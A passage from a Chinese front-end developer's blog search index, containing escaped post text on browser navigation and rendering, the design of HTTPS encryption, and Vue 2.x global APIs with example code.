&lt;p&gt;如果状态码是301（永久重定向）或者302（临时重定向），那么说明浏览器需要重定向到其他的URL。这时候网络进程会从响应头的location字段读取重定向地址，然后再次发起请求（又得重头开始）&lt;/p&gt;
&lt;p&gt;如果是304 代表无需再次传输请求的内容，可以直接用缓存的内容&lt;/p&gt;
&lt;/blockquote&gt;
&lt;br&gt;
&lt;p&gt;而对于响应数据的处理会根据&lt;code&gt;Content-Type&lt;/code&gt;类型判断是按什么类型进行处理（是HTML页面 还是下载请求等）。&lt;/p&gt;
&lt;p&gt;如果是下载流程，那么在这里就结束了。&lt;/p&gt;
&lt;p&gt;如果是HTML页面，那么还会继续进行。&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;准备渲染进程&#34;&gt;准备渲染进程&lt;/h2&gt;
&lt;p&gt;页面的渲染在浏览器的渲染进程里面&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;跳转页面的时候原来页面没有马上消失的原因：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;“提交⽂档”的消息是由浏览器进程发出的，渲染进程接收到“提交⽂档”的消息后，会和⽹络进程建⽴ 传输数据的“管道”。&lt;/li&gt;
&lt;li&gt;等⽂档数据传输完成之后，渲染进程会返回“确认提交”的消息给浏览器进程。&lt;/li&gt;
&lt;li&gt;浏览器进程在收到“&lt;strong&gt;确认提交&lt;/strong&gt;”的消息后，会更新浏览器界⾯状态，包括了安全状态、地址栏的URL、前 进后退的历史状态，并更新Web⻚⾯。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在上面那一段内容处理时间是页面没有变化的原因&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;当文档提交后进行页面渲染&lt;/p&gt;
&lt;p&gt;渲染流水线的大概步骤有：&lt;strong&gt;构建DOM树、样式计算、布局阶段、分 层、绘制、分块、光栅化和合成&lt;/strong&gt;。&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;构建dom树&#34;&gt;构建DOM树&lt;/h3&gt;
&lt;p&gt;对于浏览器来说，HTML结构无法被直接理解，浏览器需要将其转化为&lt;strong&gt;DOM树&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;那DOM树是怎么形成的呢？&lt;/p&gt;
&lt;p&gt;在渲染进程中，有个叫做 &lt;strong&gt;HTML解析器&lt;/strong&gt;，它负责将HTML字节流转化为DOM结构。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;HTML文档是一边加载一边被解析的&lt;/strong&gt;，网络进程数据后就会给渲染进程，渲染进程会一边接收一边交给&lt;strong&gt;HTML解析器&lt;/strong&gt;解析。&lt;/p&gt;
&lt;h4 id=&#34;通过分词器将字节流转化为token&#34;&gt;通过分词器将字节流转化为Token&lt;/h4&gt;
&lt;p&gt;所谓的Token，指语法上不可能再分的最小的字符或者字符串&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1631790700378.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;HTML解析器维护了⼀个Token栈结构，通过不断的压栈和出栈，将Token解析为DOM节点并将DOM节点添加到DOM树。&lt;a href=&#34;https://fanfankill.github.io/post/dom-shu-javascript-shi-ru-he-ying-xiang-dom-shu-gou-jian-de/&#34;&gt;DOM树构建的详细过程&lt;/a&gt;&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;样式计算&#34;&gt;样式计算&lt;/h2&gt;
&lt;h4 id=&#34;将css转化为浏览器可理解的形式&#34;&gt;将CSS转化为浏览器可理解的形式&lt;/h4&gt;
&lt;p&gt;当DOM树完成构建后就开始CSS文件的处理&lt;/p&gt;
&lt;p&gt;CSS样式来源一般有：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;link的外部引用&lt;/li&gt;
&lt;li&gt;文件内部样式内嵌&lt;/li&gt;
&lt;li&gt;元素样式内嵌&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;和HTML文件一样，浏览器也无法直接纯CSS文本操作，所以浏览器也会把 &lt;strong&gt;CSS纯文本转化为styleSheets&lt;/strong&gt;&lt;/p&gt;
&lt;br&gt;
&lt;h4 id=&#34;转化样式表中的属性值使其标准化&#34;&gt;转化样式表中的属性值，使其标准化&lt;/h4&gt;
&lt;p&gt;类似颜色属性&lt;code&gt;red&lt;/code&gt;会被转化为rgb标准值，&lt;code&gt;rem、em&lt;/code&gt;单位也会被转化为&lt;code&gt;px&lt;/code&gt;标准单位&lt;/p&gt;
&lt;br&gt;
&lt;h4 id=&#34;计算每个dom节点的具体样式&#34;&gt;计算每个DOM节点的具体样式&lt;/h4&gt;
&lt;p&gt;对于每个节点样式的具体计算会涉及到 &lt;strong&gt;继承和层叠&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;继承是来自父节点的继承属性，而层叠是对于不同的来源相同属性的选择。&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;布局&#34;&gt;布局&lt;/h3&gt;
&lt;p&gt;现在的DOM树和DOM样式计算已经完成，但还需要计算出DOM在页面中的几何位置。&lt;/p&gt;
&lt;h4 id=&#34;创建布局树&#34;&gt;创建布局树&lt;/h4&gt;
&lt;p&gt;DOM树还含有很多不可⻅的元素，⽐如head标签，还有使⽤了display:none属性 的元素。所以在显⽰之前，我们还要额外地构建⼀棵&lt;strong&gt;只包含可⻅元素布局树&lt;/strong&gt;。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1631790690657.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;br&gt;
&lt;h4 id=&#34;布局计算&#34;&gt;布局计算&lt;/h4&gt;
&lt;p&gt;计算出每个节点的几何位置，也保存在布局树中。&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;分层&#34;&gt;分层&lt;/h3&gt;
&lt;p&gt;页面是由图层叠加在一起形成的。&lt;/p&gt;
&lt;p&gt;为了方便实现类似于3D转化、z-index等一些效果，&lt;strong&gt;渲染进程需要为特定的节点生成专用的图层。并生成一颗图层树。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;那如何渲染进程会为其创建图层呢？&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;拥有层叠上下文属性的元素会被提升为单独一层。&lt;/li&gt;
&lt;li&gt;需要剪裁（clip）的地⽅也会被创建为图层。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;a href=&#34;https://fanfankill.github.io/post/htmlcss-he-javascriptshi-ru-he-bian-cheng-de/#%E5%88%86%E5%B1%82&#34;&gt;详细介绍&lt;/a&gt;&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;图层绘制&#34;&gt;图层绘制&lt;/h3&gt;
&lt;p&gt;对于每个图层的样式绘制&lt;/p&gt;
&lt;p&gt;会把⼀个图层的绘制拆分成很多⼩的绘制指令，然后再把这些指令按照 顺序组成⼀个&lt;strong&gt;待绘制列表&lt;/strong&gt;&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;栅格化操作&#34;&gt;栅格化操作&lt;/h3&gt;
&lt;p&gt;对于图层绘制只是把绘制指令存放在了待绘制列表中，真正的绘制操作是有渲染引擎中的&lt;strong&gt;合成线程&lt;/strong&gt;完成的。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://fanfankill.github.io/post/wei-shi-me-css-dong-hua-javascriptxiao/&#34;&gt;CSS动画为什么比Javascript高效&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;通常页面会很大，可能需要下滑很久，合成线程会将页面分成图块。&lt;/p&gt;
&lt;p&gt;我们可见页面的部分叫做 &lt;strong&gt;视口（viewport）&lt;/strong&gt;，合成线程会优先生成。&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;合成和显示&#34;&gt;合成和显示&lt;/h3&gt;
&lt;p&gt;一旦所有的图块都被光栅化，合成线程就会⽣成⼀个绘制图块的命令⸺“DrawQuad”，然后将该命令提交 给浏览器进程。&lt;/p&gt;
&lt;p&gt;浏览器进程将其⻚⾯内容绘制到内存中，最后再将内存显⽰在屏幕上。&lt;/p&gt;
&lt;p&gt;最后一个完整的页面就出来了。&lt;/p&gt;
">自我总结：当地址栏输入一个URL会发生什么？</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/httpsrang-shu-ju-chuan-shu-geng-an-quan/"" data-c="
          &lt;p&gt;起初设计HTTP协议的目的就是为了传输超文本文件，所以HTTP一直保持着明文传输的性质。但这个容易被中间部分给窃取、篡改。&lt;/p&gt;
&lt;p&gt;HTTP数据交给TCP后，会经过WIFI路由器、目标服务器等环节，存在被窃取、篡改的风险。&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;在http协议栈中引入安全层&#34;&gt;在HTTP协议栈中引入安全层&lt;/h2&gt;
&lt;p&gt;鉴于HTTP的明⽂传输使得传输过程毫⽆安全性可⾔，且制约了⽹上购物、在线转账等⼀系列场景应⽤，于 是倒逼着我们要引⼊&lt;strong&gt;加密⽅案&lt;/strong&gt;。&lt;br&gt;
从HTTP协议栈层⾯来看，我们可以在&lt;strong&gt;TCP和HTTP之间&lt;/strong&gt;插⼊⼀个安全层，所有经过安全层的数据都会被加密或者解密。&lt;br&gt;
&lt;img src=&#34;https://fanfankill.github.io/post-images/1631541052431.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;所谓HTTPS，就是在HTTP和TCP直接通信的过程中加一个安全层，让HTTP先和安全层通信，安全层再和TCP通信。&lt;/p&gt;
&lt;p&gt;所以HTTPS的重点就在于&lt;strong&gt;安全层&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;总的来说，安全层有两个主要的职责：&lt;strong&gt;对发起HTTP请求的数据进⾏加密操作&lt;/strong&gt;和对&lt;strong&gt;接收到HTTP的内容进⾏解密操作&lt;/strong&gt;。&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;第一版使用对称加密&#34;&gt;第⼀版：使⽤对称加密&lt;/h2&gt;
&lt;p&gt;所谓对称加密是指&lt;strong&gt;加密和解密都使⽤的是相同的密钥&lt;/strong&gt;。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1631540927436.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;为了让加密的密钥更加难以破解，我们让服务器和客⼾端同时决定密钥&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;浏览器发送它所⽀持的加密套件列表和⼀个随机数client-random，这⾥的加密套件是指加密的⽅法，加 密套件列表就是指浏览器能⽀持多少种加密⽅法列表。&lt;/li&gt;
&lt;li&gt;服务器会从加密套件列表中选取⼀个加密套件，然后还会⽣成⼀个随机数service-random，并将servicerandom和加密套件列表返回给浏览器。&lt;/li&gt;
&lt;li&gt;最后浏览器和服务器分别返回确认消息。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;双方产生的随机数混合起来生成一个密钥master secret。有了密钥master secret和加密套 件之后，双⽅就可以进⾏数据的加密传输了。&lt;/p&gt;
&lt;p&gt;虽然功能实现了，但其中传输client-random和service-random的过程却是明⽂的，这意味着⿊客也可以拿到协商的加密套件和 双⽅的随机数，由于利⽤随机数合成密钥的算法是公开的，所以⿊客拿到随机数之后，也可以合成密钥，这 样数据依然可以被破解，那么⿊客也就可以使⽤密钥来伪造或篡改数据了。&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;第二版使用非对称加密&#34;&gt;第⼆版：使⽤⾮对称加密&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;⾮对称加密算法有A、B两把密钥，如果你⽤A密钥来加密，那么只能使⽤B 密钥来解密；反过来，如果你要B密钥来加密，那么只能⽤A密钥来解密&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在HTTPS中，服务器会将其中的⼀个密钥通过明⽂的形式发送给浏览器，我们把这个密钥称为&lt;strong&gt;公钥&lt;/strong&gt;，服务器⾃⼰留下的那个密钥称为&lt;strong&gt;私钥&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;公钥是每个⼈都能获取到的，⽽私钥只有服务器才能知道，不 对任何⼈公开。&lt;/strong&gt;&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1631540921160.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;浏览器发送加密套件给服务器&lt;/li&gt;
&lt;li&gt;服务器选择一个加密套件和公钥返回给服务器&lt;/li&gt;
&lt;li&gt;然后是双方确认消息&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;浏览器发送数据时用公钥进行加密发送，虽然黑客可以截下来，但唯一能解读加密信息的只有服务器的私钥，这样就保证了数据的安全性。&lt;/p&gt;
&lt;p&gt;这看上去似乎很完美，不过这种⽅ 式依然存在两个严重的问题。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;第⼀个是⾮对称加密的效率太低&lt;/strong&gt;，第⼀个是⾮对称加密的效率太低&lt;/li&gt;
&lt;li&gt;**第⼆个是⽆法保证服务器发送给浏览器的数据安全。**虽然浏览器端可以使⽤公钥来加密，但是服务器端只 能采⽤私钥来加密，私钥加密只有公钥能解密，但⿊客也是可以获取得到公钥的，这样就不能保证服务器 端数据的安全了。&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h2 id=&#34;第三版对称加密和非对称加密搭配使用&#34;&gt;第三版：对称加密和⾮对称加密搭配使⽤&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;在传输数据阶段依然使⽤对称加密，但是对称加密的密钥我们采⽤⾮对称加密来传输。&lt;/strong&gt;&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1631540914621.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;⾸先浏览器向服务器发送对称加密套件列表、⾮对称加密套件列表和随机数client-random；&lt;/li&gt;
&lt;li&gt;服务器保存随机数client-random，选择对称加密和⾮对称加密的套件，然后⽣成随机数servicerandom，向浏览器发送选择的加密套件、service-random和公钥；&lt;/li&gt;
&lt;li&gt;浏览器保存公钥，并利⽤client-random和service-random计算出来pre-master，然后利⽤公钥对premaster加密，并向服务器发送加密后的数据；&lt;/li&gt;
&lt;li&gt;最后服务器拿出⾃⼰的私钥，解密出pre-master数据，并返回确认消息。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;pre-master是经过公钥加密之后传输的，所以⿊客⽆法获取到pre-master，这样⿊ 客就⽆法⽣成密钥，也就保证了⿊客⽆法破解传输过程中的数据了。&lt;/strong&gt;&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;第四版添加数字证书&#34;&gt;第四版：添加数字证书&lt;/h2&gt;
&lt;p&gt;这个权威机构称为 CA（Certificate Authority），颁发的证书就称为数字证书（Digital Certificate)。&lt;/p&gt;
&lt;p&gt;对于浏览器来说，数字证书有两个作⽤：⼀个是通过数字证书向浏览器&lt;strong&gt;证明服务器的⾝份&lt;/strong&gt;，另⼀个是&lt;strong&gt;数字证书⾥⾯包含了服务器公钥&lt;/strong&gt;。&lt;/p&gt;
">HTTPS：让数据传输更安全</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/vue-2x-quan-ju-api/"" data-c="
          &lt;h2 id=&#34;全局api&#34;&gt;全局API&lt;/h2&gt;
&lt;br&gt;
&lt;h3 id=&#34;vueextend&#34;&gt;&lt;strong&gt;Vue.extend&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;参数：&lt;code&gt;{object} options&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;用法：&lt;/p&gt;
&lt;p&gt;使用基础Vue构造器，创建一个“子类”。参数是一个包含组件选项的对象。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;data&lt;/code&gt;选项是特例，需要注意&lt;code&gt;Vue.extend()&lt;/code&gt;必须是函数&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;&amp;lt;div id=&amp;quot;mount-point&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;

// 创建构造器
var Profile = Vue.extend({
  template: &#39;&amp;lt;p&amp;gt;{{firstName}} {{lastName}} aka {{alias}}&amp;lt;/p&amp;gt;&#39;,
  data: function () {
    return {
      firstName: &#39;Walter&#39;,
      lastName: &#39;White&#39;,
      alias: &#39;Heisenberg&#39;
    }
  }
})
// 创建 Profile 实例，并挂载到一个元素上。
new Profile().$mount(&#39;#mount-point&#39;)

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;结果如下：&lt;/p&gt;
&lt;p&gt;​		&lt;code&gt;&amp;lt;p&amp;gt;Walter White aka Heisenberg&amp;lt;/p&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;br&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;vuenexttick&#34;&gt;&lt;strong&gt;Vue.nextTick&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;参数&lt;/p&gt;
&lt;p&gt;&lt;code&gt;{ Function } [callback]&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;{ Obejct } [context]&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;用法&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;在下次 DOM 更新循环结束之后执行延迟回调&lt;/strong&gt;。&lt;strong&gt;在修改数据之后立即使用这个方法，获取更新后的 DOM&lt;/strong&gt;。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;实例&lt;/p&gt;
&lt;p&gt;Vue 实现响应式并不是数据发生变化之后 DOM 立即变化，而是按一定的策略进行 DOM 的更新&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;div ref=&amp;quot;test&amp;quot;&amp;gt;{{testtex}}&amp;lt;/div&amp;gt;
&amp;lt;fan-btn @click=&amp;quot;change&amp;quot;&amp;gt;修改&amp;lt;/fan-btn&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;data(){
	return{
		testtex:&#39;mytest&#39;
	}
}
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;  change(){
         this.testtex=&#39;why&#39;
         console.log(this.$refs.test.innerHTML);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;打印出来的结果依然是 &amp;quot;mytest&amp;quot;&lt;/p&gt;
&lt;p&gt;dom还没有更新&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;使用&lt;code&gt;this.$nextTick()&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;  change(){
          this.testtex=&#39;why&#39;

          this.$nextTick(()=&amp;gt;{
            console.log(this.$refs.test.innerHTML);
          })
        }
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;输出结果是 &amp;quot;why&amp;quot;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;vueset&#34;&gt;&lt;strong&gt;Vue.set&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;参数&lt;/p&gt;
&lt;p&gt;&lt;code&gt;{ Object |Array } target&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;{ String | Number} propertyName/index&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;{ any } value&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;返回值：设置的值&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;用法&lt;/p&gt;
&lt;p&gt;用于向响应式对象添加property，并确保这个新property同样是响应式的。&lt;/p&gt;
&lt;p&gt;它必须是用于&lt;strong&gt;响应式对象&lt;/strong&gt;上添加新的property，因此Vue无法探测普通的新增property (比如 &lt;code&gt;this.myObject.newProperty = &#39;hi&#39;&lt;/code&gt;)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;实例&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;data() {
        return {
             iskan:false,

             testlis:[
               {
                 name:&#39;fan&#39;
               },{
                 name:&#39;jing&#39;
               }
             ]
        }
    },
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;当我们修改响应式对象的内容时候，视图不会跟着变化&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt; eidt(){
          this.testlis[0]={name:&#39;f&#39;}
        }
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;使用&lt;code&gt;Vue.set&lt;/code&gt;或者我们的&lt;code&gt;this.$set&lt;/code&gt;可以使页面响应式&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;eidt(){
          this.$set(this.testlis,0,{
            name:&#39;???&#39;
          })
        }
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;页面也会随着数据的修改而改变&lt;/p&gt;
&lt;br&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;vuedelete&#34;&gt;&lt;strong&gt;Vue.delete&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;参数：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;{ Object | Array } target&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;{String | Number } propertyName/index&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;用法&lt;/p&gt;
&lt;p&gt;删除对象的property。&lt;/p&gt;
&lt;p&gt;如果对象是响应式的，确保删除能触发更新视图。&lt;/p&gt;
&lt;p&gt;这个方法主要用于避开Vue不能检测到property被删除的限制&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;vuedircetive&#34;&gt;&lt;strong&gt;Vue.dircetive&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;参数：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;{String} id&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;{Function | Object} [definition]&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;用法：&lt;/p&gt;
&lt;p&gt;注册或获取全局指令&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Vue.directive&lt;/code&gt;全局注册，也可以在组件内&lt;code&gt;directive:{}&lt;/code&gt;钩子局部注册&lt;/p&gt;
&lt;p&gt;自定义指令一共有5个钩子函数，他们分别是：bind、inserted、update、componentUpdate和unbind。&lt;a href=&#34;https://cn.vuejs.org/v2/guide/custom-directive.html#%E9%92%A9%E5%AD%90%E5%87%BD%E6%95%B0&#34;&gt;钩子介绍&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;实例：&lt;/p&gt;
&lt;p&gt;全局&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// 注册一个全局自定义指令 `v-focus`Vue.directive(&#39;focus&#39;, {  // 当被绑定的元素插入到 DOM 中时……   inserted: function (el) {    // 聚焦元素    el.focus()  }})
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;局部&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;directives: {
  focus: {
    // 指令的定义
    inserted: function (el) {
      el.focus()
    }
  }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;vuefilter&#34;&gt;&lt;strong&gt;Vue.filter&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;参数：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;{String} id&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;{Function} [definition]&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;用法&lt;/p&gt;
&lt;p&gt;可被用于一些常见的文本格式化。&lt;/p&gt;
&lt;p&gt;过滤器可以用在两个地方：&lt;strong&gt;双花括号插值和 &lt;code&gt;v-bind&lt;/code&gt; 表达式&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;&amp;lt;!-- 在双花括号中 多个过滤器可以串联--&amp;gt;
&amp;lt;!--message为value里面的值 capitalize对其处理--&amp;gt;
{{ message | capitalize }}  

&amp;lt;!-- 在 `v-bind` 中 --&amp;gt;
&amp;lt;div v-bind:id=&amp;quot;rawId | formatId&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;注册或获取全局过滤器&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// 注册Vue.filter(&#39;my-filter&#39;, function (value) {  // 返回处理后的值})// getter，返回已注册的过滤器var myFilter = Vue.filter(&#39;my-filter&#39;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;也可以组件内定义过滤器&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;filters: {  capitalize: function (value) {    if (!value) return &#39;&#39;    value = value.toString()    return value.charAt(0).toUpperCase() + value.slice(1)  }}
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;vuecompont&#34;&gt;&lt;strong&gt;Vue.compont&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;参数：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;{String} id&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;{Function | Object} [defintion]&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;用法&lt;/p&gt;
&lt;p&gt;注册或获取全局组件。注册还会自动使用给定的&lt;code&gt;id&lt;/code&gt;设置组件的名称&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// 注册组件，传入一个扩展过的构造器Vue.component(&#39;my-component&#39;, Vue.extend({ /* ... */ }))// 注册组件，传入一个选项对象 (自动调用 Vue.extend)Vue.component(&#39;my-component&#39;, { /* ... */ })// 获取注册的组件 (始终返回构造器)var MyComponent = Vue.component(&#39;my-component&#39;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;循环遍历全局注册组件&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// 组件列表const allcomponents=[    fanbtn,    faninput,    fandiglog,    fanalert,    fanbadge,    fanlink,    fanimgge,]const install=function(Vue){     // 遍历并注册所有组件     allcomponents.map(component =&amp;gt;{        Vue.component(component.name, component);     })}export default {    install}//main.js文件内Vue.use(fanui) //自动调用install方法
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;vueuse&#34;&gt;&lt;strong&gt;Vue.use&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;参数：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;{object |Function } plugin&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;用法：&lt;/p&gt;
&lt;p&gt;安装 Vue.js 插件。如果插件是一个对象，必须提供 &lt;code&gt;install&lt;/code&gt; 方法。如果插件是一个函数，它会被作为 install 方法。install 方法调用时，会将 Vue 作为参数传入。&lt;/p&gt;
&lt;p&gt;该方法需要在调用 &lt;code&gt;new Vue()&lt;/code&gt; 之前被调用。&lt;/p&gt;
&lt;p&gt;当 install 方法被同一个插件多次调用，插件将只会被安装一次。&lt;/p&gt;
&lt;p&gt;如上方法示例&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;vuemixin&#34;&gt;&lt;strong&gt;Vue.mixin&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;参数：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;{Object} mixin&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;用法：&lt;/p&gt;
&lt;p&gt;全局混入的话会影响每一个Vue示例&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// 为自定义的选项 &#39;myOption&#39; 注入一个处理器。
Vue.mixin({
  created: function () {
    var myOption = this.$options.myOption
    if (myOption) {
      console.log(myOption)
    }
  }
})

new Vue({
  myOption: &#39;hello!&#39;
})
// =&amp;gt; &amp;quot;hello!&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
